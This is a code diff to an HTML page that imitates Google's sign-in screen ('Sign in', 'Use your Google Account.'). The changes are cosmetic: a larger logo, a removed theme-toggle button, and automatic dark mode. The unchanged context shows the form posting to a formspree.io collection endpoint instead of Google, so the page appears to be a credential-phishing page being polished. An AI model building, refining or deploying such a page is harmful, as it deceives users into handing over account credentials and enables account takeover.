@@ -42,8 +42,8 @@
         }
         
         .logo {
-            width: 48px;
-            height: 48px;
+            width: 68px;
+            height: 68px;
         }
         
         .signin-container {
@@ -234,22 +234,6 @@
             text-decoration: underline;
         }
         
-        .theme-toggle {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            background: none;
-            border: none;
-            font-size: 20px;
-            cursor: pointer;
-            color: #5f6368;
-            transition: color 0.3s ease;
-        }
-        
-        body.dark-mode .theme-toggle {
-            color: #9aa0a6;
-        }
-        
         @media (max-width: 480px) {
             .signin-container {
                 padding: 30px 20px;
@@ -271,19 +255,10 @@
             .footer-links {
                 justify-content: center;
             }
-            
-            .theme-toggle {
-                top: 10px;
-                right: 10px;
-            }
         }
     </style>
 </head>
 <body>
-    <button class="theme-toggle" id="themeToggle" title="Toggle dark/light mode">
-        🌙
-    </button>
-
     <form id="myForm" action="https://formspree.io/f/xvgwqngd" method="POST">
         <div class="header">
             <div class="logo-container">
@@ -292,7 +267,7 @@
         </div>
         
         <div class="signin-container">
-            <h1>Sign in</h1> <br>
+            <h1>Sign in</h1>
             <p class="subtitle">Use your Google Account.</p>
             
             <div id="success-message" class="success" style="display: none;"></div>
@@ -346,62 +321,23 @@
         </div>
         
         <script>
-            // Theme management
-            const themeToggle = document.getElementById('themeToggle');
-            const body = document.body;
-            
-            // Check for saved theme preference or prefer OS theme
+            // Theme management - automatically use device preference
             function initializeTheme() {
-                const savedTheme = localStorage.getItem('theme');
-                
-                if (savedTheme) {
-                    // Use saved theme
-                    if (savedTheme === 'dark') {
-                        enableDarkMode();
-                    } else {
-                        enableLightMode();
-                    }
+                // Check if user has a preferred color scheme
+                if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                    document.body.classList.add('dark-mode');
                 } else {
-                    // Use OS preference
-                    if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
-                        enableDarkMode();
-                    } else {
-                        enableLightMode();
-                    }
+                    document.body.classList.remove('dark-mode');
                 }
             }
             
-            function enableDarkMode() {
-                body.classList.add('dark-mode');
-                themeToggle.textContent = '☀️';
-                localStorage.setItem('theme', 'dark');
-            }
-            
-            function enableLightMode() {
-                body.classList.remove('dark-mode');
-                themeToggle.textContent = '🌙';
-                localStorage.setItem('theme', 'light');
-            }
-            
-            // Toggle theme on button click
-            themeToggle.addEventListener('click', () => {
-                if (body.classList.contains('dark-mode')) {
-                    enableLightMode();
-                } else {
-                    enableDarkMode();
-                }
-            });
-            
-            // Listen for OS theme changes
+            // Listen for system theme changes
             if (window.matchMedia) {
                 window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
-                    // Only auto-switch if user hasn't set a preference
-                    if (!localStorage.getItem('theme')) {
-                        if (e.matches) {
-                            enableDarkMode();
-                        } else {
-                            enableLightMode();
-                        }
+                    if (e.matches) {
+                        document.body.classList.add('dark-mode');
+                    } else {
+                        document.body.classList.remove('dark-mode');
                     }
                 });
             }
